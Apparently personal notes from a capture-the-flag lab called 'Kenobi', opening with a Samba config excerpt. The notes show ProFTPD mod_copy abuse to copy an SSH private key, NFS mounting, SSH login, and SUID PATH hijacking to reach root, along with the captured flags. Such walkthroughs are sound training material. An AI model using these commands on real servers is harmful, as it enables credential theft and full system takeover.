		# This option controls how unsuccessful authentication attempts are mapped
		# to anonymous connections
		   map to guest = bad user
		
		########## Domains ###########
		
		#
		# The following settings only takes effect if 'server role = primary
		# classic domain controller', 'server role = backup domain controller'
		# or 'domain logons' is set 
		#
		
		# It specifies the location of the user's
		# profile directory from the client point of view) The following
		# required a [profiles] share to be setup on the samba server (see
		# below)
		;   logon path = \\%N\profiles\%U
		# Another common choice is storing the profile in the user's home directory
		# (this is Samba's default)
		#   logon path = \\%N\%U\profile
		
		# The following setting only takes effect if 'domain logons' is set
		# It specifies the location of a user's home directory (from the client
		# point of view)
		;   logon drive = H:
		#   logon home = \\%N\%U
		
		# The following setting only takes effect if 'domain logons' is set
		# It specifies the script to run during logon. The script must be stored
		# in the [netlogon] share
		# NOTE: Must be store in 'DOS' file format convention
		;   logon script = logon.cmd
		
		# This allows Unix users to be created on the domain controller via the SAMR
		# RPC pipe.  The example command creates a user account with a disabled Unix
		# password; please adapt to your needs
		; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u
		
		# This allows machine accounts to be created on the domain controller via the 
		# SAMR RPC pipe.  
		# The following assumes a "machines" group exists on the system
		; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u
		
		# This allows Unix groups to be created on the domain controller via the SAMR
		# RPC pipe.  
		; add group script = /usr/sbin/addgroup --force-badname %g
		
		############ Misc ############
		
		# Using the following line enables you to customise your configuration
		# on a per machine basis. The %m gets replaced with the netbios name
		# of the machine that is connecting
		;   include = /home/samba/etc/smb.conf.%m
		
		# Some defaults for winbind (make sure you're not using the ranges
		# for something else.)
		;   idmap uid = 10000-20000
		;   idmap gid = 10000-20000
		;   template shell = /bin/bash
		
		# Setup usershare options to enable non-root users to share folders
		# with the net usershare command.
		
		# Maximum number of usershare. 0 (default) means that usershare is disabled.
		;   usershare max shares = 100
		
		# Allow users who've been granted usershare privileges to create
		# public shares, not just authenticated ones
		   usershare allow guests = yes
		
		#======================= Share Definitions =======================
		
		# Un-comment the following (and tweak the other settings below to suit)
		# to enable the default home directory shares. This will share each
		# user's home directory as \\server\username
		;[homes]
		;   comment = Home Directories
		;   browseable = no
		
		# By default, the home directories are exported read-only. Change the
		# next parameter to 'no' if you want to be able to write to them.
		;   read only = yes
		
		# File creation mask is set to 0700 for security reasons. If you want to
		# create files with group=rw permissions, set next parameter to 0775.
		;   create mask = 0700
		
		# Directory creation mask is set to 0700 for security reasons. If you want to
		# create dirs. with group=rw permissions, set next parameter to 0775.
		;   directory mask = 0700
		
		# By default, \\server\username shares can be connected to by anyone
		# with access to the samba server.
		# Un-comment the following parameter to make sure that only "username"
		# can connect to \\server\username
		# This might need tweaking when using external authentication schemes
		;   valid users = %S
		
		# Un-comment the following and create the netlogon directory for Domain Logons
		# (you need to configure Samba to act as a domain controller too.)
		;[netlogon]
		;   comment = Network Logon Service
		;   path = /home/samba/netlogon
		;   guest ok = yes
		;   read only = yes
		
		# Un-comment the following and create the profiles directory to store
		# users profiles (see the "logon path" option above)
		# (you need to configure Samba to act as a domain controller too.)
		# The path below should be writable by all users so that their
		# profile directory may be created the first time they log on
		;[profiles]
		;   comment = Users profiles
		;   path = /home/samba/profiles
		;   guest ok = no
		;   browseable = no
		;   create mask = 0600
		;   directory mask = 0700
		
		[printers]
		   comment = All Printers
		   browseable = no
		   path = /var/spool/samba
		   printable = yes
		   guest ok = no
		   read only = yes
		   create mask = 0700
		
		# Windows clients look for this share name as a source of downloadable
		# printer drivers
		[print$]
		   comment = Printer Drivers
		   path = /var/lib/samba/printers
		   browseable = yes
		   read only = yes
		   guest ok = no
		# Uncomment to allow remote administration of Windows print drivers.
		# You may need to replace 'lpadmin' with the name of the group your
		# admin users are members of.
		# Please note that you also need to set appropriate Unix permissions
		# to the drivers directory for these users to have write rights in it
		;   write list = root, @lpadmin
		[anonymous]
		   path = /home/kenobi/share
		   browseable = yes
		   read only = yes
		   guest ok = yes

nc 10.10.76.140 21
	220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.76.140]

searchsploit ProFTPD 1.3.5                                                                                                                   
	                        21:40:48
	------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
	 Exploit Title                                                                                                                                  |  Path
	------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
	ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                       | linux/remote/37262.rb
	ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                             | linux/remote/36803.py
	ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                         | linux/remote/49908.py
	ProFTPd 1.3.5 - File Copy                                                                                                                       | linux/remote/36742.txt
	------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
	Shellcodes: No Results
	Papers: No Results

Want to grab his private key to connect into his system. Can exploiut the mod_copy module on this version of ProFTPD to move his private key to the publicly accessible /var folder

nc 10.10.76.140 21
	SITE CPFR /home/kenobi/.ssh/id_rsa
	350 File or directory exists, ready for destination name
	SITE CPTO /var/tmp/id_rsa
	250 Copy successful
	^C

Now to mount the /var file to my system and grab the key
	mkdir /mnt/kenobiNFS
	mount 10.10.76.140:/var /mnt/kenobiNFS
	ls -la /mnt/kenobiNFS
	cd /mnt/kenobiNFS/tmp
	cp 

Now I need to move the user flag from kenobi's home directory to the tmp folder
	nc 10.10.76.140 21
		SITE CPFR /home/kenobi/user.txt
		SITE CPTO /var/tmp/user.txt
		^C
		cat /home/kali/OSCP/Kenobi/user.txt
			d0b0f3f53b6caa532a83915e19224899

# Access
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.76.140
	Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	103 packages can be updated.
	65 updates are security updates.
	
	
	Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
	To run a command as administrator (user "root"), use "sudo <command>".
	See "man sudo_root" for details.
	
	kenobi@kenobi:~$ whoami
	kenobi
	kenobi@kenobi:~$ hostnamectl 
	   Static hostname: kenobi
	         Icon name: computer-vm
	           Chassis: vm
	        Machine ID: abda1bc6784553d38e5217dd5d6f7949
	           Boot ID: 1536dbb993604e9986c4141ef90e19f5
	    Virtualization: xen
	  Operating System: Ubuntu 16.04.6 LTS
	            Kernel: Linux 4.8.0-58-generic
	      Architecture: x86-64

# Priv Esc

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
	-rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
	-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
	-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
	-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
	-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
	-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
	-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
	-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
	-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
	-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
	-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
	-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
	-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
	-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
	-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
	-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
	-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
	-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6

Running menu program
	./menu
		1. status check
		2. kernel version
		3. ifconfig
		** Enter your choice :2
		4.8.0-58-generic

So since it runs as root because of SUID and it runs programs to find these outputs then changing the filenames of sh should give us a terminal with su priv
	cd /tmp  //move to a folder with write access
	echo /bin/sh > curl  //make the contents of curl run sh as a script
	chmod 777 curl  //Give perms to the new script
	export PATH=/tmp:$PATH  //make the tmp directory part of PATH to be globally accessable
	/usr/bin/menu //run the modified menu program #1 option
		whoami
		root
		![[Pasted image 20231031021859.png]]
	flag: `177b3cd8562289f37382721c28381f02`

